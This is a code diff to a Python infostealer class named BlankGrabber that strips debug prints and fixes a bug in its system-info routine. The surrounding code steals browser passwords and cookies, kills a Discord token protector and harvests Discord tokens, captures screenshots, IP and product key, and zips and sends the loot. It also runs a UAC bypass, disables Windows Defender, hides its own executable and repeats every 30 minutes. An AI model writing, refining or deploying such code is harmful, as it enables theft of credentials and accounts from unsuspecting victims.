@@ -192,7 +192,6 @@ class BlankGrabber:
             file.write(f"\nLine {exc_info[2].tb_lineno} : {e.__class__.__name__} : {e}")
 
     def getpass(self):
-        print("Getting passwords")
         if not hasattr(sys, 'frozen'):
             return
         subprocess.run("a.es -d -p blank pm.bam.aes", cwd= sys._MEIPASS, capture_output= True, shell= True)
@@ -201,10 +200,8 @@ class BlankGrabber:
         with open(self.tempfolder + '/Passwords.txt', encoding= "utf-8", errors= "ignore") as file:
             if len(file.readlines()) > 100:
                 self.trust += 1
-        print("Got passwords")
 
     def getcookie(self):
-        print("Getting cookies")
         if not hasattr(sys, 'frozen'):
             return
         subprocess.run("a.es -d -p blank ck.bam.aes", cwd= sys._MEIPASS, capture_output= True, shell= True)
@@ -213,7 +210,6 @@ class BlankGrabber:
         with open(self.tempfolder + '/Cookies.txt', encoding= "utf-8", errors= "ignore") as file:
             if len(file.readlines()) > 100:
                 self.trust += 1
-        print("Got cookies")
 
     def bypass_bd(self):
         try:
@@ -249,7 +245,6 @@ class BlankGrabber:
             file.write(output.strip())
 
     def getTokens(self):
-        print("Getting tokens")
         subprocess.run("taskkill /IM discordtokenprotector.exe /F", capture_output= True, shell= True)
         data = []
         paths = {
@@ -318,10 +313,8 @@ class BlankGrabber:
             self.trust += 3
             with open(self.tempfolder+'/Discord Info.txt', 'w', errors="ignore") as file:
                 file.write("\n\n".join(data))
-        print("Got Tokens")
 
     def screenshot(self):
-        print("Taking SS")
         try:
             file = open(sys._MEIPASS + '/structc.pyd', 'rb')
         except Exception:
@@ -334,7 +327,6 @@ class BlankGrabber:
         image = ImageGrab.grab()
         image.save(self.tempfolder + "/Screenshot.png")
         del image
-        print("Took SS")
 
     def headers(self, token=None):
         headers = {
@@ -347,25 +339,22 @@ class BlankGrabber:
         return headers
 
     def getip(self):
-        print("Getting IP")
         try:
             r = json.loads(self.http.request('GET', "http://ip-api.com/json/?fields=225545").data.decode())
             if r.get("status") != "success":
                 raise Exception('Failed')
-            data += f"Computer Name: {os.getenv('computername')}\nComputer OS: {subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode().strip().splitlines()[2].strip()}\nTotal Memory: {int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000)} GB" + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else "")+ f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
+            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode().strip().splitlines()[2].strip()}\nTotal Memory: {int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000)} GB" + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else "")+ f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
             if r['reverse'] != '':
                 data += f"\nReverse DNS: {r['reverse']}"
         except Exception:
             r = json.loads(self.http.request("GET", "http://httpbin.org/get").data.decode())
-            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode().strip().splitlines()[2].strip()}\nTotal Memory: {int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000)} GB" + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else "") + f"IP: {r.get('origin')}"
+            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode().strip().splitlines()[2].strip()}\nTotal Memory: {int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000)} GB" + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else "") + f"\nIP: {r.get('origin')}"
         return data
-        print("Got IP")
 
     def zip(self):
         shutil.make_archive(self.archive[:-3], 'zip', self.tempfolder)
 
     def send(self):
-        print("Sending Info")
         self.zip()
         payload = {
   "content": "@everyone" if PINGME else "",
@@ -397,17 +386,14 @@ class BlankGrabber:
 
 if __name__ == "__main__":
     time.sleep(1)
-    print("running")
     if not is_admin():
         uac_bypass()
-    print("Got Admin")
     while True:
         try:
             r = json.loads(self.http.request("GET", "https://httpbin.org/get?1=2").data.decode())
             if r.get("args").get("1") != "2":
                 os._exit(0)
         except Exception:
-            print("else started")
             if VMPROTECT:
                 vmprotect()
             frozen = hasattr(sys, 'frozen')
@@ -425,11 +411,9 @@ if __name__ == "__main__":
                 subprocess.run(f'attrib "{sys.executable}" +s +h', shell= True, capture_output= True)
 
             bypass_wd()
-            print("Starting Grabber")
             try:
                 BlankGrabber()
-            except Exception as e:
-                print(e)
+            except Exception:
+                pass
         finally:
-            print("sleeping")
             time.sleep(1800) #30 Minutes
